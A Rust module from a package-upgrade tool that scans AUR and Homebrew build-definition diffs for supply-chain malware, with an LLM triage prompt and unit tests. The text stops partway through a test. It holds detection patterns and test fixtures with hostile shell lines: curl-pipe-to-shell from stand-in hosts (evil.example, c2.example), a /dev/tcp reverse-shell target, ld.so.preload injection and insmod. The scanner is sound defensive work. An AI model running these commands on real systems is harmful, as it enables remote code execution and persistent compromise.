use crate::cache::{read_cache, write_cache};
use crate::config::Config;
use crate::models::{Dependency, Ecosystem, PackageOrigin};
use anyhow::Result;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use similar::TextDiff;
use std::time::Duration;
use tokio::process::Command;

pub const DEFAULT_REVIEW_MODEL: &str = "openai/gpt-5.6-luna";
const REVIEW_CACHE_TTL_SECS: u64 = 6 * 60 * 60;
const USER_AGENT: &str = "tucupi/0.2.1 (package source review)";

/// Well-known malware identifiers from the Atomic Arch AUR campaign
/// (June 2026). These never reach the LLM for judgment: any hit is a hard block.
const KNOWN_IOC_PATTERNS: &[&str] = &["atomic-lockfile", "js-digest", "lockfile-js"];

/// High-risk primitives that justify manual review even when the LLM
/// is unavailable. Matched case-insensitively as plain substrings or
/// simple structural checks, to avoid a regex dependency.
const HIGH_RISK_PATTERNS: &[&str] = &[
    "/dev/tcp/",
    "ld.so.preload",
    "insmod ",
    "chattr +i",
    "base64 -d",
    "base64 --decode",
    "openssl enc -d",
    "eval(",
    "eval (",
    "eval $(",
    "eval `",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ReviewVerdict {
    Safe,
    Review,
    Block,
}

impl ReviewVerdict {
    pub fn as_str(&self) -> &'static str {
        match self {
            ReviewVerdict::Safe => "safe",
            ReviewVerdict::Review => "review",
            ReviewVerdict::Block => "block",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum HitSeverity {
    KnownIoc,
    HighRisk,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct KnownBadHit {
    pub severity: HitSeverity,
    pub pattern: String,
    pub line_number: usize,
    pub line: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ReviewViewMode {
    Diff,
    Full,
    Unavailable,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ReviewReport {
    pub verdict: ReviewVerdict,
    pub reason: String,
    pub view_mode: ReviewViewMode,
    pub residual_line_count: usize,
    pub hits: Vec<KnownBadHit>,
}

impl ReviewReport {
    fn unavailable(reason: &str) -> Self {
        Self {
            verdict: ReviewVerdict::Review,
            reason: reason.to_string(),
            view_mode: ReviewViewMode::Unavailable,
            residual_line_count: 0,
            hits: Vec::new(),
        }
    }

    pub fn has_known_ioc(&self) -> bool {
        self.hits
            .iter()
            .any(|hit| hit.severity == HitSeverity::KnownIoc)
    }
}

/// Whether a dependency's package source should be reviewed before upgrade.
/// Official pacman repos are GPG-signed and excluded; AUR packages and all
/// Homebrew formulae/casks carry reviewable build definitions.
pub fn needs_review(dep: &Dependency) -> bool {
    match dep.ecosystem {
        Ecosystem::Pacman => dep.origin == Some(PackageOrigin::Aur),
        Ecosystem::Homebrew => true,
        _ => false,
    }
}

pub fn scan_known_bad(content: &str) -> Vec<KnownBadHit> {
    let mut hits = Vec::new();

    for (index, raw_line) in content.lines().enumerate() {
        let line = raw_line.to_lowercase();
        for pattern in KNOWN_IOC_PATTERNS {
            if line.contains(pattern) {
                hits.push(KnownBadHit {
                    severity: HitSeverity::KnownIoc,
                    pattern: (*pattern).to_string(),
                    line_number: index + 1,
                    line: raw_line.trim().to_string(),
                });
            }
        }

        for pattern in HIGH_RISK_PATTERNS {
            if line.contains(pattern) {
                hits.push(KnownBadHit {
                    severity: HitSeverity::HighRisk,
                    pattern: (*pattern).to_string(),
                    line_number: index + 1,
                    line: raw_line.trim().to_string(),
                });
            }
        }

        if let Some(hit) = detect_pipe_to_shell(index, raw_line) {
            hits.push(hit);
        }
    }

    hits
}

fn detect_pipe_to_shell(index: usize, raw_line: &str) -> Option<KnownBadHit> {
    let lowered = raw_line.to_lowercase();
    if !lowered.contains("curl") && !lowered.contains("wget") {
        return None;
    }

    let pipe_position = lowered.rfind('|')?;
    let after_pipe = lowered[pipe_position + 1..].trim_start();
    let is_shell = ["sh", "bash", "zsh", "dash"]
        .iter()
        .any(|shell| after_pipe.starts_with(shell));

    if is_shell {
        Some(KnownBadHit {
            severity: HitSeverity::HighRisk,
            pattern: "pipe-to-shell".to_string(),
            line_number: index + 1,
            line: raw_line.trim().to_string(),
        })
    } else {
        None
    }
}

/// Rewrite the old version string to the new one so pure version bumps
/// (including versions embedded in source URLs) disappear from the diff.
/// Occurrences embedded inside a longer dotted token (e.g. `1.2` inside
/// `1.2.3`) are left untouched: mangling them would corrupt URLs and could
/// mask real changes, so the residual diff errs on the side of showing more.
pub fn normalize_versions(content: &str, old_version: &str, new_version: &str) -> String {
    if old_version.is_empty() || new_version.is_empty() || old_version == new_version {
        return content.to_string();
    }

    let mut result = String::with_capacity(content.len() + new_version.len());
    let bytes = content.as_bytes();
    let mut consumed = 0usize;

    while let Some(relative) = content[consumed..].find(old_version) {
        let start = consumed + relative;
        let end = start + old_version.len();

        let before_is_version = start > 0 && is_version_boundary_byte(bytes[start - 1]);
        let after_is_version = is_embedded_after(bytes, end);

        result.push_str(&content[consumed..start]);
        if before_is_version || after_is_version {
            result.push_str(&content[start..end]);
        } else {
            result.push_str(new_version);
        }
        consumed = end;
    }

    result.push_str(&content[consumed..]);
    result
}

fn is_version_boundary_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'.' || byte == b'_'
}

/// True when the byte range starting at `end` continues a longer version
/// token: either a digit directly, or a dot followed by a digit (`1.2` in
/// `1.2.3`). A dot followed by a letter (`1.2.3.tar.gz`) is a filename
/// separator, so the token has ended.
fn is_embedded_after(bytes: &[u8], end: usize) -> bool {
    match bytes.get(end) {
        None => false,
        Some(b'.') => matches!(bytes.get(end + 1), Some(next) if next.is_ascii_digit()),
        Some(next) => next.is_ascii_digit() || next.is_ascii_alphabetic(),
    }
}

/// Remove checksum-only blocks from a PKGBUILD so checksum churn caused by
/// version bumps does not pollute the residual diff. Source URLs are kept:
/// domain changes are meaningful signal.
pub fn strip_pkgbuild_noise(content: &str) -> String {
    const CHECKSUM_KEYS: &[&str] = &[
        "sha256sums=",
        "sha512sums=",
        "sha384sums=",
        "sha224sums=",
        "md5sums=",
        "b2sums=",
        "cksums=",
    ];

    let mut output = String::new();
    let mut skipping = false;

    for line in content.lines() {
        let trimmed = line.trim_start();
        if !skipping {
            if CHECKSUM_KEYS.iter().any(|key| trimmed.starts_with(key)) {
                skipping = !trimmed.contains(')');
                continue;
            }
        } else {
            if trimmed.contains(')') {
                skipping = false;
            }
            continue;
        }
        output.push_str(line);
        output.push('\n');
    }

    output
}

/// Remove checksum-only content from a Homebrew formula/cask definition:
/// `sha256 ...` lines and whole `bottle do ... end` blocks.
pub fn strip_formula_noise(content: &str) -> String {
    let mut output = String::new();
    let mut in_bottle_block = false;

    for line in content.lines() {
        let trimmed = line.trim_start();
        if trimmed == "bottle do" {
            in_bottle_block = true;
            continue;
        }
        if in_bottle_block {
            if trimmed == "end" {
                in_bottle_block = false;
            }
            continue;
        }
        if trimmed.starts_with("sha256 ") {
            continue;
        }
        output.push_str(line);
        output.push('\n');
    }

    output
}

/// Compute the residual diff between the installed version's package
/// definition and the current one, after version normalization and noise
/// stripping. Empty residual + no known-bad hits = pure version bump.
pub fn compute_residual(
    old_content: &str,
    new_content: &str,
    old_version: &str,
    new_version: &str,
    pkgbuild_style: bool,
) -> String {
    let normalized_old = normalize_versions(old_content, old_version, new_version);
    let clean_old = if pkgbuild_style {
        strip_pkgbuild_noise(&normalized_old)
    } else {
        strip_formula_noise(&normalized_old)
    };
    let clean_new = if pkgbuild_style {
        strip_pkgbuild_noise(new_content)
    } else {
        strip_formula_noise(new_content)
    };

    TextDiff::from_lines(&clean_old, &clean_new)
        .unified_diff()
        .context_radius(3)
        .to_string()
}

/// Count the meaningful changed lines (additions + deletions) in a diff.
pub fn count_residual_lines(diff_text: &str) -> usize {
    diff_text
        .lines()
        .filter(|line| {
            (line.starts_with('+') && !line.starts_with("+++"))
                || (line.starts_with('-') && !line.starts_with("---"))
        })
        .count()
}

pub fn parse_verdict_output(output: &str) -> Option<(ReviewVerdict, String)> {
    let mut verdict = None;
    let mut reason = String::new();

    for line in output.lines() {
        let line = line.trim();
        if verdict.is_none() {
            if let Some(rest) = line.strip_prefix("VERDICT:") {
                verdict = match rest.trim().to_lowercase().as_str() {
                    "safe" => Some(ReviewVerdict::Safe),
                    "review" => Some(ReviewVerdict::Review),
                    "block" => Some(ReviewVerdict::Block),
                    _ => None,
                };
            }
        } else if reason.is_empty() {
            if let Some(rest) = line.strip_prefix("REASON:") {
                reason = rest.trim().to_string();
            }
        }
    }

    verdict.map(|parsed| (parsed, reason))
}

fn http_client() -> Client {
    Client::builder()
        .timeout(Duration::from_secs(15))
        .user_agent(USER_AGENT)
        .build()
        .unwrap_or_default()
}

async fn fetch_text(client: &Client, url: &str) -> Option<String> {
    let response = client.get(url).send().await.ok()?;
    if !response.status().is_success() {
        return None;
    }
    response.text().await.ok()
}

struct PkgbuildSources {
    baseline: Option<String>,
    current: String,
    install_files: String,
}

async fn fetch_pkgbuild_sources(dep: &Dependency) -> Result<PkgbuildSources> {
    let client = http_client();
    let url = format!(
        "https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h={}",
        dep.name
    );
    let current = fetch_text(&client, &url)
        .await
        .filter(|content| !content.trim().is_empty())
        .ok_or_else(|| anyhow::anyhow!("could not fetch current PKGBUILD from AUR"))?;

    let clone_dir = paru_clone_dir(dep);
    let baseline_path = clone_dir.join("PKGBUILD");
    let baseline = tokio::fs::read_to_string(&baseline_path)
        .await
        .ok()
        .filter(|content| !content.trim().is_empty());

    let mut install_files = String::new();
    if let Ok(entries) = tokio::fs::read_dir(&clone_dir).await {
        let mut dir_entries = entries;
        while let Ok(Some(entry)) = dir_entries.next_entry().await {
            let path = entry.path();
            if path.extension().and_then(|ext| ext.to_str()) == Some("install") {
                if let Ok(content) = tokio::fs::read_to_string(&path).await {
                    let file_name = path
                        .file_name()
                        .and_then(|name| name.to_str())
                        .unwrap_or("unknown.install");
                    install_files.push_str(&format!("--- {file_name} ---\n{content}\n"));
                }
            }
        }
    }

    Ok(PkgbuildSources {
        baseline,
        current,
        install_files,
    })
}

fn paru_clone_dir(dep: &Dependency) -> std::path::PathBuf {
    let cache_root = std::env::var("XDG_CACHE_HOME")
        .unwrap_or_else(|_| format!("{}/.cache", std::env::var("HOME").unwrap_or_default()));
    std::path::PathBuf::from(cache_root)
        .join("paru")
        .join("clone")
        .join(&dep.name)
}

struct FormulaSources {
    baseline: Option<String>,
    current: String,
    tap: String,
    path: String,
}

async fn fetch_formula_sources(dep: &Dependency) -> Result<FormulaSources> {
    let client = http_client();

    let info_output = Command::new("brew")
        .args(["info", "--json=v2", &dep.name])
        .output()
        .await
        .map_err(|_| anyhow::anyhow!("brew is not available"))?;
    if !info_output.status.success() {
        return Err(anyhow::anyhow!("brew info failed for {}", dep.name));
    }
    let info_json: serde_json::Value = serde_json::from_slice(&info_output.stdout)?;
    let entries = info_json
        .get("formulae")
        .and_then(|value| value.as_array())
        .filter(|array| !array.is_empty())
        .or_else(|| {
            info_json
                .get("casks")
                .and_then(|value| value.as_array())
                .filter(|array| !array.is_empty())
        });
    let tap = entries
        .and_then(|array| array.first())
        .and_then(|entry| entry.get("tap"))
        .and_then(|value| value.as_str())
        .unwrap_or("homebrew/core")
        .to_string();

    let repo = match tap.as_str() {
        "homebrew/core" => "Homebrew/homebrew-core".to_string(),
        "homebrew/cask" => "Homebrew/homebrew-cask".to_string(),
        other => {
            let (user, name) = other
                .split_once('/')
                .ok_or_else(|| anyhow::anyhow!("unrecognized tap: {other}"))?;
            format!("{user}/homebrew-{name}")
        }
    };

    let is_cask_tap = tap == "homebrew/cask";
    let letter = dep.name.chars().next().unwrap_or('a').to_string();
    let mut candidates: Vec<String> = Vec::new();
    if is_cask_tap {
        candidates.push(format!("Casks/{letter}/{}.rb", dep.name));
        candidates.push(format!("Casks/{}.rb", dep.name));
    } else if tap == "homebrew/core" {
        candidates.push(format!("Formula/{letter}/{}.rb", dep.name));
        candidates.push(format!("Formula/{}.rb", dep.name));
    } else {
        candidates.push(format!("Formula/{letter}/{}.rb", dep.name));
        candidates.push(format!("Formula/{}.rb", dep.name));
        candidates.push(format!("{}.rb", dep.name));
        candidates.push(format!("Casks/{letter}/{}.rb", dep.name));
        candidates.push(format!("Casks/{}.rb", dep.name));
    }

    let mut current = None;
    let mut path = String::new();
    for candidate in &candidates {
        let url = format!("https://raw.githubusercontent.com/{repo}/HEAD/{candidate}");
        if let Some(content) = fetch_text(&client, &url).await {
            if !content.trim().is_empty() {
                current = Some(content);
                path = candidate.clone();
                break;
            }
        }
    }
    let current = current.ok_or_else(|| anyhow::anyhow!("could not fetch formula from {repo}"))?;

    let baseline = find_formula_baseline(&client, &repo, &path, dep, &tap).await;

    Ok(FormulaSources {
        baseline,
        current,
        tap,
        path,
    })
}

async fn find_formula_baseline(
    client: &Client,
    repo: &str,
    path: &str,
    dep: &Dependency,
    tap: &str,
) -> Option<String> {
    let api_url = format!("https://api.github.com/repos/{repo}/commits?path={path}&per_page=100");
    let mut request = client.get(&api_url);
    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
        if !token.is_empty() {
            request = request.bearer_auth(&token);
        }
    }
    let response = request.send().await.ok()?;
    if !response.status().is_success() {
        return None;
    }
    let commits: serde_json::Value = response.json().await.ok()?;
    let commits = commits.as_array()?;

    let installed_version = dep.current_version.as_str();
    let version_without_revision = installed_version
        .split('_')
        .next()
        .unwrap_or(installed_version);
    let exact_subject = format!("{} {}", dep.name, installed_version);
    let exact_without_revision = format!("{} {}", dep.name, version_without_revision);

    for commit in commits {
        let message = commit
            .get("commit")
            .and_then(|commit| commit.get("message"))
            .and_then(|value| value.as_str())
            .unwrap_or("");
        let subject = message.lines().next().unwrap_or("").trim();

        let matched = subject == exact_subject
            || subject == exact_without_revision
            || (subject.starts_with(&format!("{}:", dep.name))
                && (subject.contains(installed_version)
                    || subject.contains(version_without_revision)));

        if !matched {
            continue;
        }

        let sha = commit.get("sha").and_then(|value| value.as_str())?;
        let raw_url = format!("https://raw.githubusercontent.com/{repo}/{sha}/{path}");
        if let Some(content) = fetch_text(client, &raw_url).await {
            if !content.trim().is_empty() {
                return Some(content);
            }
        }
    }

    let _ = tap;
    None
}

async fn llm_verdict(model: &str, payload: &str) -> Option<(ReviewVerdict, String)> {
    let prompt = format!(
        "You are doing supply-chain security triage for package build definitions \
(PKGBUILD for the AUR, .rb formulae/casks for Homebrew). Context: attackers adopt \
orphaned packages and inject malicious commands into build definitions (npm preinstall \
droppers, curl|bash, eBPF rootkits). You receive the diff between the installed \
version's definition and the new one, with benign version bumps and checksum noise \
already removed (or the full file when no baseline exists), plus install scripts.

Judge ONLY the changed/added code. Version bumps, checksum value changes and rebuild \
revisions are benign. Red flags: piping downloads into shell, installing unexpected \
npm/bun/pip packages, base64/eval obfuscation, network access inside install-time code \
when it did not exist before, writes to ~/.ssh, ~/.aws, ~/.gnupg, browser profiles, \
/etc/ld.so.preload, kernel modules, out-of-place or typosquatted domains, new source \
hosts, SKIP checksums on non-git sources.

Be conservative: anything suspicious or unfamiliar = review; clearly malicious = block; \
trivial/benign = safe. Do not invent issues; do not flag cosmetics.

Answer EXACTLY this format, nothing else:
VERDICT: safe|review|block
REASON: <one short line>

{payload}"
    );

    let output = Command::new("opencode")
        .args(["run", "-m", model, &prompt])
        .output()
        .await
        .ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    parse_verdict_output(&stdout)
}

fn verdict_from_deterministic_only(
    report_hits: &[KnownBadHit],
    has_residual: bool,
) -> ReviewVerdict {
    if report_hits
        .iter()
        .any(|hit| hit.severity == HitSeverity::KnownIoc)
    {
        ReviewVerdict::Block
    } else if has_residual || !report_hits.is_empty() {
        ReviewVerdict::Review
    } else {
        ReviewVerdict::Safe
    }
}

/// Review the package source of an AUR or Homebrew dependency before upgrade.
pub async fn review_package(dep: &Dependency, config: &Config) -> ReviewReport {
    if !needs_review(dep) {
        return ReviewReport::unavailable("source review not applicable to this ecosystem");
    }

    let cache_key = format!(
        "review:{}:{}:{}:{}",
        dep.ecosystem.as_str(),
        dep.name,
        dep.current_version,
        dep.latest_version
    );
    if let Some(cached) = read_cache::<ReviewReport>(
        "pkgreview",
        &cache_key,
        Duration::from_secs(REVIEW_CACHE_TTL_SECS),
    ) {
        return cached;
    }

    let report = match dep.ecosystem {
        Ecosystem::Pacman => review_pkgbuild(dep, config).await,
        Ecosystem::Homebrew => review_formula(dep, config).await,
        _ => ReviewReport::unavailable("source review not applicable to this ecosystem"),
    };

    let _ = write_cache("pkgreview", &cache_key, &report);
    report
}

async fn review_pkgbuild(dep: &Dependency, config: &Config) -> ReviewReport {
    let sources = match fetch_pkgbuild_sources(dep).await {
        Ok(sources) => sources,
        Err(error) => return ReviewReport::unavailable(&error.to_string()),
    };

    let residual = match &sources.baseline {
        Some(baseline) => {
            let diff = compute_residual(
                baseline,
                &sources.current,
                &dep.current_version,
                &dep.latest_version,
                true,
            );
            if diff.trim().is_empty() {
                (ReviewViewMode::Diff, String::new())
            } else {
                (ReviewViewMode::Diff, diff)
            }
        }
        None => {
            let full = sources.current.clone();
            (ReviewViewMode::Full, full)
        }
    };

    let (view_mode, diff_text) = residual;
    let mut hits = scan_known_bad(&diff_text);
    if !sources.install_files.is_empty() {
        hits.extend(scan_known_bad(&sources.install_files));
    }

    if hits.iter().any(|hit| hit.severity == HitSeverity::KnownIoc) {
        return ReviewReport {
            verdict: ReviewVerdict::Block,
            reason: "known Atomic Arch IoC found in package source".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
        };
    }

    if diff_text.trim().is_empty() && sources.install_files.is_empty() {
        return ReviewReport {
            verdict: ReviewVerdict::Safe,
            reason: "version bump only, no code changes".to_string(),
            view_mode,
            residual_line_count: 0,
            hits,
        };
    }

    if !config.review_llm() {
        let verdict = verdict_from_deterministic_only(&hits, !diff_text.trim().is_empty());
        return ReviewReport {
            verdict,
            reason: "deterministic scan only (LLM review disabled)".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
        };
    }

    let payload = format!(
        "package: {} (AUR)  installed={}  new={}
deterministic hits: {}{}",
        dep.name,
        dep.current_version,
        dep.latest_version,
        format_hits(&hits),
        if sources.install_files.is_empty() {
            format!("\n--- {view_mode:?} view ---\n{diff_text}")
        } else {
            format!(
                "\n--- install scripts ---\n{}--- {view_mode:?} view ---\n{diff_text}",
                sources.install_files
            )
        }
    );

    match llm_verdict(&config.review_model(), &payload).await {
        Some((verdict, reason)) => ReviewReport {
            verdict,
            reason,
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
        },
        None => ReviewReport {
            verdict: ReviewVerdict::Review,
            reason: "LLM output unparsable — treat as unreviewed".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
        },
    }
}

async fn review_formula(dep: &Dependency, config: &Config) -> ReviewReport {
    let sources = match fetch_formula_sources(dep).await {
        Ok(sources) => sources,
        Err(error) => return ReviewReport::unavailable(&error.to_string()),
    };

    let (view_mode, diff_text) = match &sources.baseline {
        Some(baseline) => {
            let diff = compute_residual(
                baseline,
                &sources.current,
                &dep.current_version,
                &dep.latest_version,
                false,
            );
            if diff.trim().is_empty() {
                (ReviewViewMode::Diff, String::new())
            } else {
                (ReviewViewMode::Diff, diff)
            }
        }
        None => (ReviewViewMode::Full, sources.current.clone()),
    };

    let hits = scan_known_bad(&diff_text);
    let is_third_party = sources.tap != "homebrew/core" && sources.tap != "homebrew/cask";

    if hits.iter().any(|hit| hit.severity == HitSeverity::KnownIoc) {
        return ReviewReport {
            verdict: ReviewVerdict::Block,
            reason: "known Atomic Arch IoC found in package source".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
        };
    }

    if diff_text.trim().is_empty() {
        return ReviewReport {
            verdict: ReviewVerdict::Safe,
            reason: "version bump only, no code changes".to_string(),
            view_mode,
            residual_line_count: 0,
            hits,
        };
    }

    if !config.review_llm() {
        let verdict = verdict_from_deterministic_only(&hits, true);
        return ReviewReport {
            verdict,
            reason: "deterministic scan only (LLM review disabled)".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
        };
    }

    let payload = format!(
        "package: {} ({})  installed={}  new={}
source: {} ({})
deterministic hits: {}
--- {:?} view ({} lines) ---
{}",
        dep.name,
        sources.tap,
        dep.current_version,
        dep.latest_version,
        if is_third_party {
            "THIRD-PARTY tap"
        } else {
            "official"
        },
        sources.path,
        format_hits(&hits),
        view_mode,
        count_residual_lines(&diff_text),
        diff_text
    );

    match llm_verdict(&config.review_model(), &payload).await {
        Some((verdict, reason)) => ReviewReport {
            verdict,
            reason,
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
        },
        None => ReviewReport {
            verdict: ReviewVerdict::Review,
            reason: "LLM output unparsable — treat as unreviewed".to_string(),
            view_mode,
            residual_line_count: count_residual_lines(&diff_text),
            hits,
        },
    }
}

fn format_hits(hits: &[KnownBadHit]) -> String {
    if hits.is_empty() {
        return "none".to_string();
    }
    hits.iter()
        .map(|hit| format!("line {}: [{}] {}", hit.line_number, hit.pattern, hit.line))
        .collect::<Vec<_>>()
        .join("; ")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scan_known_bad_detects_atomic_arch_iocs() {
        let content = "build() {\n  npm install atomic-lockfile\n}";
        let hits = scan_known_bad(content);
        assert!(hits
            .iter()
            .any(|hit| hit.severity == HitSeverity::KnownIoc && hit.pattern == "atomic-lockfile"));
    }

    #[test]
    fn test_scan_known_bad_detects_pipe_to_shell() {
        let content = "post_install() {\n  curl -fsSL https://evil.example/install.sh | sh\n}";
        let hits = scan_known_bad(content);
        assert!(hits
            .iter()
            .any(|hit| hit.pattern == "pipe-to-shell" && hit.severity == HitSeverity::HighRisk));
    }

    #[test]
    fn test_scan_known_bad_clean_content_has_no_hits() {
        let content = "package() {\n  make DESTDIR=\"$pkgdir\" install\n}";
        assert!(scan_known_bad(content).is_empty());
    }

    #[test]
    fn test_normalize_versions_rewrites_embedded_versions() {
        let old = r#"url "https://example.com/tool-1.2.3.tar.gz""#;
        let normalized = normalize_versions(old, "1.2.3", "2.0.0");
        assert_eq!(normalized, r#"url "https://example.com/tool-2.0.0.tar.gz""#);
    }

    #[test]
    fn test_strip_pkgbuild_noise_removes_checksum_blocks() {
        let content = "source=(\"https://example.com/pkg-$pkgver.tar.gz\")\nsha256sums=('abc123')\npackage() {\n  true\n}";
        let stripped = strip_pkgbuild_noise(content);
        assert!(stripped.contains("source="));
        assert!(stripped.contains("package()"));
        assert!(!stripped.contains("sha256sums"));
    }

    #[test]
    fn test_strip_formula_noise_removes_bottle_block() {
        let content = "class Foo < Formula\n  url \"https://example.com\"\n  bottle do\n    sha256 cellar: :any, arm64: \"aaa\"\n  end\n  def install\n    true\n  end\nend";
        let stripped = strip_formula_noise(content);
        assert!(stripped.contains("def install"));
        assert!(!stripped.contains("bottle do"));
        assert!(!stripped.contains("cellar"));
    }

    #[test]
    fn test_compute_residual_pure_version_bump_is_empty() {
        let old = "url \"https://example.com/tool-1.2.3.tar.gz\"\nsha256sums=('deadbeef')\npackage() {\n  true\n}\n";
        let new = "url \"https://example.com/tool-2.0.0.tar.gz\"\nsha256sums=('cafebabe')\npackage() {\n  true\n}\n";
        let residual = compute_residual(old, new, "1.2.3", "2.0.0", true);
        assert_eq!(count_residual_lines(&residual), 0);
    }

    #[test]
    fn test_compute_residual_detects_injected_command() {
        let old = "package() {\n  make install\n}\n";
        let new = "package() {\n  curl https://evil.example/x.sh | sh\n  make install\n}\n";
        let residual = compute_residual(old, new, "1.0.0", "1.1.0", true);
        assert!(residual.contains("curl"));
        assert!(count_residual_lines(&residual) > 0);
    }

    #[test]
    fn test_parse_verdict_output_accepts_all_verdicts() {
        let (verdict, reason) =
            parse_verdict_output("VERDICT: safe\nREASON: version bump only").unwrap();
        assert_eq!(verdict, ReviewVerdict::Safe);
        assert_eq!(reason, "version bump only");

        let (verdict, _) =
            parse_verdict_output("VERDICT: review\nREASON: new network call").unwrap();
        assert_eq!(verdict, ReviewVerdict::Review);

        let (verdict, _) =
            parse_verdict_output("VERDICT: block\nREASON: malicious dropper").unwrap();
        assert_eq!(verdict, ReviewVerdict::Block);
    }

    #[test]
    fn test_parse_verdict_output_rejects_garbage() {
        assert!(parse_verdict_output("I could not analyze this package").is_none());
    }

    #[test]
    fn test_needs_review_matrix() {
        let make_dep = |ecosystem: Ecosystem, origin: Option<PackageOrigin>| Dependency {
            name: "test".to_string(),
            current_version: "1.0.0".to_string(),
            latest_version: "1.1.0".to_string(),
            ecosystem,
            is_global: true,
            origin,
        };

        assert!(needs_review(&make_dep(
            Ecosystem::Pacman,
            Some(PackageOrigin::Aur)
        )));
        assert!(!needs_review(&make_dep(
            Ecosystem::Pacman,
            Some(PackageOrigin::OfficialRepo)
        )));
        assert!(needs_review(&make_dep(Ecosystem::Homebrew, None)));
        assert!(!needs_review(&make_dep(Ecosystem::Cargo, None)));
    }

    #[test]
    fn test_verdict_from_deterministic_only() {
        let ioc_hit = KnownBadHit {
            severity: HitSeverity::KnownIoc,
            pattern: "atomic-lockfile".to_string(),
            line_number: 1,
            line: "npm install atomic-lockfile".to_string(),
        };
        assert_eq!(
            verdict_from_deterministic_only(&[ioc_hit], true),
            ReviewVerdict::Block
        );
        assert_eq!(
            verdict_from_deterministic_only(&[], false),
            ReviewVerdict::Safe
        );
    }

    // ---- adversarial scanner coverage -------------------------------------

    #[test]
    fn test_scan_known_bad_detects_every_ioc_pattern() {
        for (pattern, content) in [
            ("atomic-lockfile", "npm install atomic-lockfile"),
            ("js-digest", "bun install js-digest"),
            ("lockfile-js", "npx lockfile-js setup"),
        ] {
            let hits = scan_known_bad(content);
            assert!(
                hits.iter()
                    .any(|hit| hit.severity == HitSeverity::KnownIoc && hit.pattern == pattern),
                "expected KnownIoc hit for {pattern}"
            );
        }
    }

    #[test]
    fn test_scan_known_bad_pipe_to_shell_variants() {
        let cases = [
            "curl -fsSL https://x.example/i.sh | bash",
            "wget -qO- https://x.example/i.sh |sh",
            "curl https://x.example/i.sh |  zsh",
            "curl https://x.example/i.sh | dash",
            "CURL https://x.example/i.sh | SH",
        ];
        for content in cases {
            let hits = scan_known_bad(content);
            assert!(
                hits.iter().any(|hit| hit.pattern == "pipe-to-shell"),
                "expected pipe-to-shell hit for: {content}"
            );
        }
    }

    #[test]
    fn test_scan_known_bad_does_not_flag_benign_pipes() {
        let cases = [
            "curl https://x.example/data.json | jq .name",
            "wget -O pkg.tar.gz https://x.example/pkg.tar.gz",
            "curl -fsSL https://x.example/i.sh | grep curl",
        ];
        for content in cases {
            assert!(
                scan_known_bad(content).is_empty(),
                "false positive for: {content}"
            );
        }
    }

    #[test]
    fn test_scan_known_bad_detects_high_risk_primitives() {
        let cases = [
            "/dev/tcp/10.0.0.1/4444",
            "echo /usr/lib/evil.so > /etc/ld.so.preload",
            "insmod rootkit.ko",
            "chattr +i /etc/persistence.conf",
            "echo aGVsbG8= | base64 -d | sh",
            "printf %s $payload | base64 --decode",
            "openssl enc -d -aes-256-cbc -in payload.bin",
            "eval $(curl https://x.example)",
        ];
        for content in cases {
            let hits = scan_known_bad(content);
            assert!(
                hits.iter().any(|hit| hit.severity == HitSeverity::HighRisk),
                "expected HighRisk hit for: {content}"
            );
        }
    }

    #[test]
    fn test_scan_known_bad_is_case_insensitive_for_iocs() {
        assert!(scan_known_bad("NPM INSTALL Atomic-Lockfile")
            .iter()
            .any(|hit| hit.severity == HitSeverity::KnownIoc));
    }

    #[test]
    fn test_scan_known_bad_reports_line_numbers() {
        let content = "line one\nline two\nnpm install atomic-lockfile\nline four";
        let hits = scan_known_bad(content);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].line_number, 3);
        assert_eq!(hits[0].line, "npm install atomic-lockfile");
    }

    #[test]
    fn test_scan_known_bad_empty_and_multiline() {
        assert!(scan_known_bad("").is_empty());
        let content = "clean line\natomic-lockfile\nclean line\njs-digest\n";
        let hits = scan_known_bad(content);
        assert_eq!(hits.len(), 2);
    }

    #[test]
    fn test_scan_known_bad_ioc_beats_nothing_on_install_scripts() {
        let install_script = "pre_install() {\n  npm install atomic-lockfile\n}\n\npost_install() {\n  curl https://c2.example/p | sh\n}\n";
        let hits = scan_known_bad(install_script);
        assert!(hits.iter().any(|hit| hit.severity == HitSeverity::KnownIoc));
        assert!(hits.iter().any(|hit| hit.pattern == "pipe-to-shell"));
    }

    // ---- version normalization boundaries ----------------------------------

    #[test]
    fn test_normalize_versions_does_not_mangle_longer_versions() {
        // "1.2" must not corrupt "1.2.3"
        let content = "url \"https://example.com/tool-1.2.3.tar.gz\"";
        let normalized = normalize_versions(content, "1.2", "3.0");
        assert_eq!(normalized, content);
    }

    #[test]
    fn test_normalize_versions_replaces_full_token_with_dashes() {
        let content = "url \"https://example.com/curl-8.19.0.tar.bz2\"";
        let normalized = normalize_versions(content, "8.19.0", "8.21.0");
        assert_eq!(
            normalized,
            "url \"https://example.com/curl-8.21.0.tar.bz2\""
        );
    }

    #[test]
    fn test_normalize_versions_replaces_every_occurrence() {
        let content =
            "pkgver=1.0.0\nsource=(\"https://x.example/p-1.0.0.tgz\")\nsha256sums=('aaa')";
        let normalized = normalize_versions(content, "1.0.0", "2.0.0");
        assert!(normalized.contains("pkgver=2.0.0"));
        assert!(normalized.contains("p-2.0.0.tgz"));
        assert!(!normalized.contains("1.0.0"));
    }

    #[test]
    fn test_normalize_versions_noop_cases() {
        let content = "pkgver=1.0.0";
